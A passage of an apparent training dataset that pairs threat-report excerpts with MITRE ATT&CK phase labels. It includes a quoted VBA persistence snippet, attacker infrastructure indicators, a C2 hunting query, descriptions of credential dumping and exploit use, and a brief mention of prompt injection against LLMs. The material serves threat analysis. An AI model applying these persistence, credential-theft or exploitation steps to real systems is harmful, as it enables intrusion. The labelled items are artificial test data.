        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The infection chain instrumented by the VBA macros consist of creating three key artifacts on the infected endpoint: \nRegistry key for persistence. Malicious VB script intermediate component that the macro sets up for persistence. \nMalicious PowerShell-based downloader script: The actual post-infection, payload instrumentor used for executing arbitrary code on the infected endpoint. \nThe VB script's persistence is set up by creating a malicious Registry Run for the infected user: HKCU\\Software\\Microsoft\\windows\\CurrentVersion\\Run | <random> \n18 Set KFpLY = Createobject(\"WScript.shell\")   \n19 KFpLY.RegWrite (   \n20 \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\eHdFSLbXE\"   \n21 \"rundll32.exe pcwutl.dll,LaunchApplication USErPROFILE\\Links\\GIPiyHag.vbs\",   \n22 \"REG_sz\") '\\` Persistency \nThis campaign relies on the use of a LoLBin to execute the malicious VBScript. \nIn some instances, the attackers make use of a LoLBin DLL called pcwutl.dll, which is part of the operating system, to execute the VBScript on reboot or re-login. Although the usage of LoLBins is fairly common as a means of lateral movement, it is not commonly used to execute the malicious payload. ",
        "output": "persistence",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Mandiant has previously highlighted different ways threat actors can leverage AI-based tools to support their operations, or use these applications to help process open source information, as well as data that has already been stolen for reconnaissance and target selection. \nState-sponsored intelligence services can apply machine learning and data science tools to massive quantities of stolen and open-source data to improve data processing and analysis, allowing espionage actors to operationalize collected information with greater speed and efficiency. These tools can also identify patterns to improve tradecraft techniques identifying foreign individuals for intelligence recruitment in traditional espionage operations and crafting effective social engineering campaigns. \nAt Black Hat USA 2016, researchers presented an AI tool called the Social Network Automated Phishing with Reconnaissance system, or SNAP_R, which suggests high-value targets and analyzes users' past Twitter activity to generate personalized phishing material based on a user's old tweets (see Figure 6). \nMandiant has previously demonstrated how threat actors can leverage neural networks to \nThreat Actors are Interested in Generative AI, but Use Remains Limited | Google Cloud Blog generate inauthentic content for information operations. \nWe identified indications of North Korean cyber espionage actor APT43 interest in LLMs, specifically Mandiant observed evidence suggesting the group has logged on to widely available LLM tools. The group may potentially leverage LLMs to enable their operations, however the intended purpose is unclear. \nIn 2023 security researchers at Black Hat USA highlighted how prompt injection attacks integrated into LLMs could potentially support various stages of the attack lifecycle. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In addition to modifying browser setting and components, Adrozek also changes several systems settings to have even more control of the compromised device. It stores its configuration parameters at the registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\<programName>. The 'tag' and 'did' entries contain the command-line arguments that it uses to launch the main payload. More recent variants of Adrozek use random characters instead of 'tag' or 'did'. \nTo maintain persistence, the malware creates a service named \"Main Service\". ",
        "output": "persistence",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Beginning on Sept. 17 and continuing through early October, we observed scanning against ManageEngine ADSelfService Plus servers. Through global telemetry, we believe that the actor targeted at least 370 Zoho ManageEngine servers in the United States alone. Given the scale, we assess that these scans were largely indiscriminate in nature as targets ranged from education to Department of Defense entities.\nUpon obtaining scan results, the threat actor transitioned to exploitation attempts on Sept. 22. These attempts focused onCVE-2021-40539, which allows for REST API authentication bypass with resultant remote code execution in vulnerable devices. To achieve this result, the actors delivered uniquely crafted POST statements to the REST API LicenseMgr.\nWhile we lack insight into the totality of organizations that were exploited during this campaign, we believe that, globally, at least nine entities across the technology, defense, healthcare, energy and education industries were compromised. Following successful exploitation, the actor uploaded a payload which deployed a Godzilla webshell, thereby enabling additional access to a victim network. The following leased IP addresses in the United States were observed interacting with compromised servers:\n24.64.36[.]23845.63.62[.]10945.76.173[.]10345.77.121[.]23266.42.98[.]156140.82.17[.]161149.28.93[.]184149.248.11[.]205199.188.59[.]192\nFollowing the deployment of the webshell, which appears consistent across all victims, we also identified the use of additional tools deployed in a subset of compromised networks. Specifically, the actors deployed a custom variant of an open-source backdoor called NGLite and a credential-harvesting tool we track as KdcSponge. The following sections provide detailed analysis of these tools.",
        "output": "initial access",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Mandiant has identified a new access operations group UNC5174 that uses the personas \"Uteus\" (alternate spelling \"uetus\") on underground forums, which we assess with moderate confidence operates from China. UNC5174 was linked with several hacktivist collectives including \"Dawn Calvary\" and \"Genesis Day\" prior to 2023 and has also claimed to be affiliated with the PRC MSS as an access broker and possible contractor who conducts for profit intrusions. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After compromising a host, the threat actors attempt to compromise other connected systems to move within the network. BRONZE BUTLER typically uses the following procedure for lateral movement: \nThe malicious file is typically a batch file that downloads malware and registers the malware's automatic execution in the registry.   \nFigure 13 shows the scheduled task that executes zrun.bat (a batch file) using the at command. ",
        "output": "lateral movement",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Bazar DLL masquerading as a jpg made use of HTTPS C2 throughout the full length of the intrusion.\nBazar C2\n64.227.65.60:443\n161.35.147.110:443\n161.35.155.92:443\n64.227.69.92:443\nCobalt Strike\nThe first DLL [D574.dll] didn't produce any immediate follow on activity, whereas D8B3.dll was loaded by RunDll32 and associated with many activities, from file creation, process execution and persistent network connectivity to 82.117.252[.]143:443 throughout the intrusion.\nD574.dll loaded by RunDll32 process with persistent DNS query activity to volga.azureedge[.]net, but no established network connectivity.\nWe observed that the DLL payload \"D574.dll\" had issues contacting the domain volga.azureedge[.]net and C2 server viaDNS 9003 response codes.\nExternal sandboxes show the domain tied to other Cobalt Strike beacon samples not associated with this report, it is likely the server was taken down by this time.\nhttps://tria.ge/210803-w15fxk72ns\nhttps://capesandbox.com/analysis/175977/\nD8B3.dll illustrates initial activity, followed by established network connectivity to 82.117.252[.]143:80.\nD8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion. It was the main payload to facilitate the bulk of the initial intrusion and ongoing activities to maintain access. The DLL 143.dll used in lateral movement from the beachhead host to the backup server also communicated to this Cobalt Strike server. Once the attackers gained a foothold and pivoted laterally, they were able to switch to using RDP and access specific hosts of interest.\nfive.azureedge.net 82.117.252.143:80\ncheckauj.com 82.117.252.143:443\nCobalt Strike Config\n82.117.252.143  checkauj.com",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Although we do not know how the backdoor code made it into the library, from the recent campaigns, research indicates that the attackers might have compromised internal build or distribution systems of SolarWinds, embedding backdoor code into a legitimate SolarWinds library with the file name SolarWinds.Orion.Core.BusinessLayer.dll . This backdoor can be distributed via automatic update platforms or systems in target networks. Microsoft security researchers currently have limited information about how the attackers compromised these platforms. ",
        "output": "initial access",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Cyber espionage activity linked to the People's Republic of China (PRC) targeting Brazil dates back more than a decade. Since 2020, we have observed 15 PRC cyber espionage groups targeting users in \nBrazil, and these groups have accounted for over $40\\%$ of government-backed phishing activity targeting Brazil. As the largest recipient of Chinese investment in Latin America, this volume of PRC cyber espionage is reminiscent of activity in other regions where Chinese government investment has been focused, such as countries within China's Belt and Road Initiative. In addition to activity targeting Gmail users, PRC groups have targeted Brazil's military, national government, diplomatic organizations, and the provincial governments of multiple Brazilian states. These groups have targeted users in Brazil using tactics ranging from phishing to malware distribution and exploitation of known vulnerabilities. \nIn August 2023, for example, Google detected a campaign from a PRC group that targeted nearly two hundred users in a Brazilian executive branch organization. The phishing emails contained links to an encrypted ZIP archive hosted on a known phishing domain. Organizations in Brazil's state governments have also been a target. In late 2022, PRC actors used an operational relay box (ORB) network to anonymize their activity and attempted to send a mass phishing campaign to nearly two thousand email addresses, including 70 email addresses in the .br ccTLD, the majority of which belonged to Brazilian state government organizations. The mass email, which Gmail blocked, contained a malicious TAR attachment designed to exploit CVE-2022-41352, an n-day vulnerability in the Zimbra Collaboration Suite that enables an attacker to upload arbitrary files and gain unauthorized access to other user accounts. The \ncampaign targeted organizations globally and appeared opportunistic - most of the targeted email addresses were addressed to the domain admin (e.g., admin@[domain].gov.br). \nPRC cyber espionage activity against local and provincial entities is of note in light of campaigns by threat actors such as UNC4841 that have focused on similar targets globally, including in Brazil. As part of their exploitation of the Barracuda Email Security Gateway in 2023, UNC4841 targeted a Brazilian business association focused on promoting statelevel commerce across several industries. \nPhishing pages created by PRC cyber espionage groups targeting Brazil's government ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1195.002: Compromise Software Supply Chain T1199: Trusted Relationship T1566.001: Spearphishing Attachment T1566.002: Spearphishing Link ",
        "output": "initial access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: A scheduled task was created to keep the Trickbot malware persistent on the system.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Cyclops Blink uses OpenSSL (version 1.0.1f) to support C2 communication underneath TLS. Each time the malware beacons it randomly selects a destination from the current list of C2 server IPv4 addresses and hard-coded list of C2 ports. \nBeacons consist of queued messages containing data from running modules. Each message is individually encrypted using AES-256-CBC. The OpenSSL_EVP_SealInit function is used to randomly generate the encryption key and IV for each message, and then encrypt them using the hard-coded RSA public key. \nThe OpenSSL_RSA_public_decrypt function is used to decrypt tasking, received in response to beacons, using the hard-coded RSA public key. The decrypted command is expected to be formatted as follows: \nThe core component responds to the following commands: ",
        "output": "command and control",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In this case we did not observe the initial delivery for the malware. BazarLoader however tends to arrive in an environment via malicious email campaigns and in a few cases its been reported viacall centerssocial engineering users to load the malware. Seeing that this starts with a DLL file it is more likely that this was related to an email campaign using maliciouszipped Javascriptfiles.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We observed the AnyDesk application created under the folder c:\\users\\<REDACTED>\\Videos', an unusual location and suspicious location for process activity  this is a good detection opportunity where portable executables appear on non-standard file system locations.\nAnyDeskis a closed source remote desktop application that is available for several operating systems. It is free for private use. We observed a long connection initiated from the AnyDesk application towards legitimately registered IPv4 ranges. However, we did not observe many events of interest during these sessions.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Look for backdoor establishing network connections to command and control. Run query in Microsoft Defender for Endpoint \nDeviceNetworkEvents where RemoteUrl in\\~('codevexillium.org',   \n'angeldonationblog.com',   \n'investbooking.de',   \n'krakenfolio.com') ",
        "output": "command and control",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Unit 29155 cyber actors have used Shodan to scan for Internet of Things (IoT) devices, using exploitation scripts to authenticate to IP cameras with default usernames and passwords [T1078.001], and exfiltrating images [T1125] (JPG files). Attempts are then made to perform remote command execution via web to vulnerable IP cameras; if successful, cyber actors would dump configuration settings and credentials in plaintext (as shown in Table 1 below) [T1552.001]. \nAppendix B: Indicators of Compromise lists threat actor IP addresses associated with the activity detailed in this section. \nNote: These events are independent and not correlated as a single timeline of compromise. \nIn addition, incident analysis identified the general observations listed below on victim infrastructure. Each event should be considered independent and may have been used by Unit 29155 cyber actors against multiple victims at different dates and timeframes. Appendix B: Indicators of Compromise lists IOCs associated with the observations in Table 1 and below. \n\uf0a7 In one instance shortly following a deployment of WhisperGate malware, Unit 29155 cyber actors exfiltrated data to mega[.]nz using Rclone [T1567.002].   \n\uf0a7 Unit 29155 cyber actors used a Pass-the-Hash [T1550.002] via ProxyChains. Cyber actors performed SSH and SSHPass executions. \nCyber actors initiated a web request and executed commands via ProxyChains. This included obtaining NT hashes via Server Message Block (SMB) using smbclient, executing Windows Management Instrumentation (WMI) with hashes, and making web requests with resources i.php and tunnel.jsp. In one instance, cyber actors used smbclient via ProxyChains to access internal network shares, and subsequently PSQL and MySQL clients to access internal databases. \nCyber actors used Impacket for post-exploitation and lateral movement. The script secretsdump.py was used from the Impacket framework to obtain domain credentials, while psexec.py was subsequently used to move laterally within a victim network. \nCyber actors used ntlmrelayx.py via Impacket and krbrelayx.py, which requires Impacket to function. \nCyber actors used Responder.py. \nCyber actors used su-bruteforce to brute force a selected user using the su command. \nCyber actors used BloodHound, an open source AD reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment. \nCyber actors used CrackMapExec via ProxyChains with SMB protocol targeting internal victim IP addresses. This open source post-exploitation tool automates assessing the security of large AD networks. \nCyber actors used LinPEAS, an open source script designed to automate the process of searching for potential privilege escalation vulnerabilities on a Linux victim. \nCyber actors used GO Simple Tunnel (GOST) (MD5: 896e0f54fc67d72d94b40d7885f10c51) for 30 days within one incident and against additional victims on various occasions. GOST is a tunneling tool designed to establish secure connections between clients and servers, allowing for secure data transmission over untrusted networks. \nCyber actors used Through the Wire against a victim's internet-facing Confluence server. Through the Wire is a proof of concept[14] exploit for CVE-2022-26134, an OGNL injection vulnerability allowing an unauthenticated user to execute arbitrary code on a Confluence Server or Data Center instance. All versions of Confluence Server and Data Center prior to the fixed versions listed by Atlassian are affected by this vulnerability.[15] A reverse shell over HTTPS was used to communicate over listening host on port 8081. \nCyber actors initiated Nmap scans on localized web servers. \nCyber actors performed lateral movement from compromised web servers to exploit a corporate Microsoft Windows network, commonly using psexec.py from the Impacket framework. The script secretsdump.py from the Impacket framework was used to obtain domain credentials. \nCyber actors may have used Raspberry Robin malware in the role of an access broker [T1588.001]. \nCyber actors targeted victims' Microsoft Outlook Web Access (OWA) infrastructure with password spraying to obtain valid usernames and passwords [T1110.003]. ",
        "output": "lateral movement",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As an extension of their aforementioned credential harvesting operations, during 2022\u20132023, Mandiant observed APT42 exfiltrate documents of interest to Iran and sensitive information from the victims' public cloud infrastructure. These victims were located in the U.S. and the UK in the legal services and NGO sectors. However, since the initial enabler of these operations lies with credential harvesting, which APT42 conducts worldwide, it is possible the victimology is much wider. \nThese operations began with enhanced social engineering schemes to gain the initial access to victim networks, often involving ongoing trustbuilding correspondence with the victim. Only then the desired credentials are acquired and multifactor authentication (MFA) is bypassed, by serving a cloned website to capture the MFA token (which failed) and later by sending MFA push notifications to the victim (which succeeded). \nThese techniques have allowed APT42 to covertly access and compromise the victim's Microsoft 365 environment, relying on built-in features and open-source tools to decrease their chances of being detected. \nAPT42 cloud operations attack lifecycle can be described in details as follows: \nSocial engineering schemes involving decoys and trust building, which includes masquerading as legitimate NGOs and conducting ongoing correspondence with the target, sometimes lasting several weeks. \nThe threat actor masqueraded as wellknown international organizations in the legal and NGO fields and sent emails from domains typosquatting the original NGO domains, for example aspenlnstitute[.]org. \nThe Aspen Institute became aware of this spoofed domain and collaborated with industry partners, including blocking it in SafeBrowsing, thus protecting users of Google Chrome and additional browsers. \nworking at the aforementioned organizations when creating the email personas. \nAPT42 enhanced their campaign credibility by using decoy material inviting targets to legitimate and relevant events and conferences. In one instance, the decoy material was hosted on an attackercontrolled SharePoint folder, accessible only after the victim entered their credentials. Mandiant did not identify malicious elements in the files, suggesting they were used solely to gain the victim's trust. \nCredential harvesting and bypassing MFA. Only after a certain level of trust was built with the victim, APT42 harvested the desired credentials by sending the victim a link that would redirect them to a credential harvesting site, similar to the process described in the previously discussed credential theft section. \nultimately serve fake Microsoft 365 login pages. \nAt least once, Mandiant observed APT42 use several methods-both SharePoint login and fake LinkedIn login pages-to target multiple high-profile personnel of the victim organization during the same campaign. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We assess with high confidence that the intrusions discussed in this report are associated with the Deathstalker threat actor group. The attribution is based on the use of the new Janicab variant, unique TTPs, victimology, and infrastructure used by the threat actor operators. Comparative intrusion analysis of Janicab and Powersing highlights similarities in several phases of the cyber kill chain. \nIn summary: \nSame SID and metadata for LNK droppers used in previous Deathstalker intrusions;   \nSimilar persistence mechanism between Janicab and Powersing using LNK in the startup folder;   \nJanicab has a similar infection execution flow and uses interpreted-language toolsets such as VBS, VBE, and Python;   \nJanicab macOS and Windows versions have Python file naming similar to EVILNUM malware (e.g., runner.py, serial.txt, etc.); \nEVILNUM runner.py for file transfer \nJanicab2021runner.py snippet forfile transfer \nOld Janicab for MacOS runner.py for starting background service with file transfer capability \n$\\bullet$ The use of Python-based toolset and libraries is common across all Deathstalker intrusions using Janicab, Powersing, EVILNUM, and PowerPepper;   \nThe use of YouTube, among other web services/DDRs, is common across Janicab and Powersing intrusions; the method of calling and parsing YouTube and the other DDRs for C2 IP address is almost identical in Janicab, Powersing, and EVILNUM; The identified C2 IPs fall within ASNs seen previously with PowerPepper intrusions;   \nDiverse victimology with a focus on legal and financial institutions, possibly targeted by other hacker-for-hire threat groups;   \nBased on our KTAE similarities engine, the dll (Stormwind) keylogger being used is over $90\\%$ similar to an older variant seen in previous Powersing intrusions;   \n$\\bullet$ Identical code blocks in old/new Janicab and Powersing:   \ns://securelist.com/deathstalker-targets-legal-entities-with-new-janicab-variant/108131/   \nVirtual machine detection through processes and virtual MAC addresses; the listing order for the MAC addresses are identical between both malware families, and even between the 2015 and 2021 Janicab versions;   \nAlmost identical anti-analysis process detection. ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor leveraged the following methods to access the hosts within the network:\nIcedID \nCobalt Strike \nCSharp Streamer \nScreenConnect\nIcedID\nThe forked IcedID loader established connection to command and control server modalefastnow[.]com over port 443, which resolved at the time to 212.18.104.12. The contents of the network connection matched a malware rule in the Emerging Threats Open ruleset \"ET MALWARE Win32/IcedID Request Cookie\".\nAfter the initial infection, the second stage IcedID DLL communicated with the following C2 servers:\nCobalt Strike\nThe threat actor dropped Cobalt Strike beacons across hosts during the intrusion, communicating with the following IP addresses.\nTheDFIR Threat intelligence feedstracked this infrastructure as a live Cobalt Strike server starting 2023-09-29 through 2023-10-30.\nThe following URIs were accessed for 85.209.11.48:\nUsing MemProcFS to process the memory from the backup server, we were able to extract the minidump for the injected Cobalt Strike process. Using the minidump, the beacon configuration was able to be parsed using1768.py:\nCSharp Streamer\nThe \"cslite.exe\" CSharp Streamer executable communicated to the IP address 109.236.80.191. During the intrusion, we observed traffic to it across various ports, including 135, 139, 80, 443, and 3389. Most traffic was observed at 443 and 3389. Looking at the memory of the \"cslite.exe\" run in a sandbox, we can extract the configured communication preferences for the trojan:\nThe malware usesWebSocketsfor communication, as observed with the wss:// in the URL. We also see that the communication was setup to usesocket.io, to proxy the communication. And if the malware cannot reach a specific port, it rotates through a list of various ports, likely to both evade ports blocked in the victim firewall and help obfuscate communication by changing the port in use throughout an intrusion.\nDuring the intrusion, we observed several Zeek notice messages alerting on the self-signed certificate used by the CSharp Streamer command and control server.\nScreenConnect\nPost the initial forked IcedID loader infection, the threat actor deployed ScreenConnect on the beachhead using a renamed binary \"toovey.exe\". Later, ScreenConnect was installed on multiple systems by dropping renamed installer and executing it through Impacket's wmiexec.py script.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: LSASS Dump\nThe threat actor dropped theSysinternals executableprocdump64.exe, which they then used to dump thelsassprocess. The command observed was:\nRegistry Hives Dump\nUsing the Cobalt Strike beacon, injected in a svchost.exe process, the threat actors dumpedSAM,SECURITY, andSYSTEMhives using the nativereg.exeutility. Below are the commands that were used:",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID Persistence\nUpon IcedID execution, a scheduled task named{3D0CCC72-D85D-7A63-8C0A-66CF5BAFD686}was created. The task was scheduled to execute every hour:\nThe new scheduled task was registered under EID 106 as seen below. (EIDs: 106,200,201 \"Microsoft-Windows-TaskScheduler\\Operational.evtx\")\nCorrelating this with Process Execution logs from MDE, shows that the task was executing the IcedID downloaded DLL:\nCobalt Strike Persistence\nWhile analyzing this intrusion, we observed further persistence via scheduled tasks associated with post-exploitation activities.This scheduled task with nameHpSupportexecuted a Cobalt Strike Beaconkaslose64.dllboth on the Domain Controller and the File Server:\nOn the File Server, the same Scheduled task was created with a slightly different name:\nThestar.batscript contained the following lines in both cases:",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The graph below shows detailed actions performed through IcedID, including reconnaissance and Cobalt Strike beacons drops:",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: LemonDuck spreads in a variety of ways, but the two main methods are (1) compromises that are either edge-initiated or facilitated by bot implants moving laterally within an organization, or (2) bot-initiated email campaigns. \nLemonDuck acts as a loader for many other follow-on activities, but one if its main functions is to spread by compromising other systems. Since its first appearance, the LemonDuck operators have leveraged scans against both Windows and Linux devices for open or weakly authenticated SMB, Exchange, SQL, Hadoop, REDIS, RDP, or other edge devices that might be vulnerable to password spray or application vulnerabilities like CVE-2017-0144 (EternalBlue), CVE-2017-8464 (LNK RCE), CVE-2019-0708 (BlueKeep), CVE-2020-0796 (SMBGhost), CVE-2021-26855 (ProxyLogon), CVE-2021-26857 (ProxyLogon), CVE-2021-26858 (ProxyLogon), and CVE-2021-27065 (ProxyLogon). \nOnce inside a system with an Outlook mailbox, as part of its normal exploitation behavior, LemonDuck attempts to run a script that utilizes the credentials present on the device. The script instructs the mailbox to send copies of a phishing message with preset messages and attachments to all contacts. \nBecause of this method of contact messaging, security controls that rely on determining if an email is sent from a suspicious sender don't apply. This means that email security policies that reduce scanning or coverage for internal mail need to be re-evaluated, as sending emails through contact scraping is very effective at bypassing email controls. \nFrom mid-2020 to March 2021, LemonDuck's email subjects and body content have remained static, as have the attachment names and formats. These attachment names and formats have changed very little from similar campaigns that occurred in early 2020. \nSample email subjects \nSample email body content \nThe Truth of COVID-19 COVID-19 nCov Special info WHO HALTH ADVISORY:CORONA VIRUS . WTF What the fcuk good bye farewell letter broken file This is your order? \nVirus actually comes from United States of America   \nvery important infomation for Covid-19 see attached document for your action and discretion.   \nthe outbreak of CORONA VIRUS is cause of concern especially where forign personal have recently arrived or will be arriving at various intt in near future. what's wrong with you?are you out of your mind!!!!! are you out of your mind!!!!!what 's wrong with you? good bye, keep in touch can you help me to fix the file,i can't read it   \nfile is brokened, i can't open it \nThe attachment used for these lures is one of three types: .doc, .js, or a .zip containing a .js file. Whatever the type, the file is named \"readme\". Occasionally, all three types are present in the same email. \nWhile the JavaScript is detected by many security vendors, it might be classified with generic detection names. It could be valuable for organizations to sanitize JavaScript or VBScript executing or calling prompts (such as PowerShell) directly from mail downloads through solutions such as custom detection rules. \nSince LemonDuck began operating, the .zip to .js file execution method is the most common. The JavaScript has replaced the scheduled task that LemonDuck previously used to kickstart the PowerShell script. This PowerShell script has looked very similar throughout 2020 and 2021, with minor changes depending on the version, indicating continued development. Below is a comparison of changes from the most recent iterations of the email-delivered downloads and those from April of 2020. ",
        "output": "initial access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1005: Data from Local System T1039: Data from Network Shared Drive T1074: Data Staged \nT1114.002: Remote Email Collection T1213.002: Sharepoint T1213.003: Code Repositories T1560.001: Archive via Utility ",
        "output": "collection",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1007: System Service Discovery   \nT1012: Query Registry   \nT1016: System Network Configuration Discovery   \nT1016.001: Internet Connection Discovery   \nT1033: System Owner/User Discovery   \nT1046: Network Service Scanning   \nT1049: System Network Connections Discovery   \nT1057: Process Discovery \nT1069: Permission Groups Discovery T1069.001: Local Groups T1069.002: Domain Groups T1082: System Information Discovery T1083: File and Directory Discovery T1087: Account Discovery T1087.001: Local Account T1087.002: Domain Account T1482: Domain Trust Discovery T1518: Software Discovery ",
        "output": "discovery",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1190 Exploit Public-Facing Application\nSQL Injection  The threat actor usedsqlmap(S0225) andghaurito conduct SQL injections attacks on target hosts.\nThe bash history file recorded the execution of these tools and the commands used:\nSqlmap output files\nHere we can see the admin user, password, email, login date and login time from the admin_login table:\nHere the threat actor exfiltrated a list of 179 email addresses from a power company:\nMetasploit Exploits\nIn the Metasploit and Meterpreter history files we observed the following exploit modules used by the threat actor:\nexchange_proxylogon_rce CVE-2021-26855 CVE-2021-27065\nphp_fpm_rce CVE-2019-11043\nvmware_vcenter_uploadova_rce CVE-2021-21972\nPython Exploits\nIn the bash history we observed the threat actor leveraging several python CVE exploit scripts:\nCVE-2020-14882.py CVE-2020-14882\nCVE-2020-14882 is a pre-authentication remote code execution exploit that targets Oracle WebLogic Servers running on Windows or Linux.\nWhen successful  this exploit creates a shell on the victim system. Logs from the output of the session were found in the root directory. In this session, the threat actor gainednt authority\\systemaccess and was observed performing some initial system discovery, as well as using the type command to write out a certificate file matching the name of one of the targets.\nCVE-2023-25157.py CVE-2023-25157\nCVE-2023-25157 is a SQL Injection exploit that targets GeoServer OGC Filter servers.\nCVE-2023-2982.py CVE-2023-2982\nCVE-2023-2982 is an authentication bypass vulnerability in a WordPress plugin named Miniorange Social Login and Register. We observed the threat actor make a directory named exploits. Then clone this exploit into it, cd into the directory, and attempt to exploit a target.\nCVE-2019-9978WordPress_remote_code_execution_by_Abu\nCVE-2019-9978 is a stored XSS vulnerability found in the Social Warfare plugin for WordPress. We observed the threat actor clone and then execute the exploit against a target.\nstruts-pwnCVE-2017-5638\nCVE-2017-5638 is parameter parsing error in the Content-Type HTTP header in Apache Struts that results in a remote command injection vulnerability.\nGhostcat  CVE-2020-1938\nCVE-2020-1938 is a file read inclusion vulnerability in Apache Tomcat. You can see below the threat actor again cloned the exploit from GitHub then attempted to exploit the target.\nWhile eight systems were observed vulnerable in the nuclei scan output for this vulnerability  only one was observed being targeted in the bash history:\nphpunit.py CVE-2017-9841\nCVE-2017-9841 is an unauthenticated remote command execution vulnerability in PHP Unit.\njexboss CVE-2015-5317, CVE-2016-3427, CVE-2016-8735, CVE-2017-5638\nJexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Servers. It covers several vulnerabilities and provides the ability to check target lists or networks, as well as exploit vulnerable hosts.\nWhile the bash history only shows indications of the tools being run in file-scan mode (meaning the tools checks for vulnerabilities from a target list provided), additional output spanning an eleven day span was observed.\nFurther review of the files in the directory indicate the threat actor created a run.py python script to automate the exploitation attempts of of individual targets identified as potentially vulnerability in first file mode scan.\nPulse Secure Exploits\nAlso found in the exploits folder were two bash scripts that appeared to be exploits for Pulse Secure VPN's, which have had multiple high risk exploits documented in recent years.\nThe pulse_secure_file_read.sh is a directory traversal vulnerability that can result in session information being stolen from the firewalls, and possibly reused.\nThe pulse_secure_2021.sh 